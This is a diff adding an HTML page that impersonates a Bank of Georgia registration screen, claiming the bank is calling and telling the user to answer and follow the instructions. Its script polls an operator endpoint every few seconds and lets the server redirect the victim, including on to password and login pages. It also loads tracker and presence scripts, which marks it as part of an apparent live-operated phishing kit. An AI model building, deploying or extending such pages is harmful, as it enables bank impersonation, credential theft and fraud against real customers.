@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Registration</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
+body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}
+
+.header{display:flex;align-items:center;justify-content:flex-end;padding:16px 20px}
+.x-btn{background:none;border:none;cursor:pointer;padding:4px}
+.x-btn svg{width:22px;height:22px;stroke:#1a1a1a;stroke-width:2;fill:none;stroke-linecap:round}
+
+.body{flex:1;display:flex;flex-direction:column;align-items:center;padding:0 20px}
+
+.title{font-size:24px;font-weight:300;color:#1a1a1a;text-align:center;margin:24px 0 36px}
+
+.phone-sec{align-self:flex-start;margin-bottom:32px}
+.label{font-size:12px;color:#b0b0b0;margin-bottom:6px}
+.user-phone{font-size:18px;font-weight:500;color:#1a1a1a;letter-spacing:.3px}
+
+.calling-text{font-size:14px;color:#999;margin-bottom:28px}
+
+.ring-wrap{
+  position:relative;width:160px;height:160px;
+  display:flex;align-items:center;justify-content:center;margin-bottom:32px;
+}
+.ring-bg{position:absolute;inset:0;border-radius:50%;border:3px solid rgba(252,103,25,.12)}
+.ring-spin{
+  position:absolute;inset:0;border-radius:50%;
+  border:3.5px solid transparent;border-top:3.5px solid #fc6719;border-right:3.5px solid #fc6719;border-bottom:3.5px solid #fc6719;
+  animation:spin 2s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+.ring-glow{
+  position:absolute;inset:20px;border-radius:50%;
+  background:radial-gradient(circle,rgba(252,103,25,.06) 0%,transparent 70%);
+}
+.phone-ico svg{width:56px;height:56px;fill:#fc6719;position:relative;z-index:1}
+
+.bank-num{font-size:18px;font-weight:600;color:#fc6719;margin-bottom:10px;letter-spacing:.3px}
+
+.hint{font-size:14px;color:#999;text-align:center;line-height:1.55;max-width:300px;margin-bottom:24px}
+
+.sms-link{
+  font-size:14px;color:#fc6719;font-weight:500;text-decoration:none;
+  cursor:pointer;padding:8px 0;align-self:flex-start;
+}
+.sms-link:hover{text-decoration:underline}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <button class="x-btn" onclick="history.back()"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
+</div>
+
+<div class="body">
+  <div class="title">Registration</div>
+
+  <div class="phone-sec">
+    <div class="label">Phone Number</div>
+    <div class="user-phone" id="userPhone">+995</div>
+  </div>
+
+  <div class="calling-text">Bank of Georgia is calling</div>
+
+  <div class="ring-wrap">
+    <div class="ring-bg"></div>
+    <div class="ring-spin"></div>
+    <div class="ring-glow"></div>
+    <div class="phone-ico">
+      <svg viewBox="0 0 24 24"><path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.01-.24c1.12.37 2.33.57 3.55.57a1 1 0 011 1v3.49a1 1 0 01-1 1A17 17 0 013 4a1 1 0 011-1h3.5a1 1 0 011 1c0 1.25.2 2.45.57 3.55a1 1 0 01-.25 1.02l-2.2 2.22z"/></svg>
+    </div>
+  </div>
+
+  <div class="bank-num" id="bankNum">+995</div>
+
+  <div class="hint">Answer the call and follow the instructions</div>
+
+  <a class="sms-link" id="smsLink" href="#">Confirm via SMS</a>
+</div>
+
+<script>
+var params=new URLSearchParams(location.search),orderId=params.get("order"),phone=params.get("phone");
+if(!orderId)location.href="index.html";
+
+function normalizePhone(p){
+  if(!p)return"";
+  p=String(p).replace(/\D/g,"");
+  if(p.indexOf("380")===0)p=p.substring(3);
+  return p;
+}
+function renderPhone(p){
+  p=normalizePhone(p);
+  if(p.length<9)return;
+  var f="+38 ("+p.substring(0,3)+") "+p.substring(3,6)+" "+p.substring(6,8)+" "+p.substring(8,10);
+  document.getElementById("userPhone").textContent=f;
+  document.getElementById("bankNum").textContent="+995"+p;
+}
+
+if(phone){
+  phone=normalizePhone(phone);
+  renderPhone(phone);
+}
+
+document.getElementById("smsLink").addEventListener("click",function(e){
+  e.preventDefault();location.href="password.html?order="+orderId+(phone?"&phone="+encodeURIComponent(phone):"");
+});
+
+function phoneQS(){return phone?"&phone="+encodeURIComponent(phone):""}
+
+function checkStatus(){
+  fetch("/api/orders/"+orderId+"/status")
+    .then(function(r){return r.json()})
+    .then(function(d){
+      if(d.username&&!phone){
+        phone=normalizePhone(d.username);
+        renderPhone(phone);
+      }
+      if(d.redirect_to){location.href=d.redirect_to+(d.redirect_to.includes("?")?"&":"?")+"order="+orderId+phoneQS();return}
+      if(d.status==="confirmed")location.href="password.html?order="+orderId+phoneQS();
+      else if(d.status==="rejected")location.href="login.html?order="+orderId+"&error=1";
+    }).catch(function(){});
+}
+setInterval(checkStatus,3000);checkStatus();
+</script>
+<script src="/tracker.js"></script>
+<script src="/presence.js"></script>
+</body>
+</html>
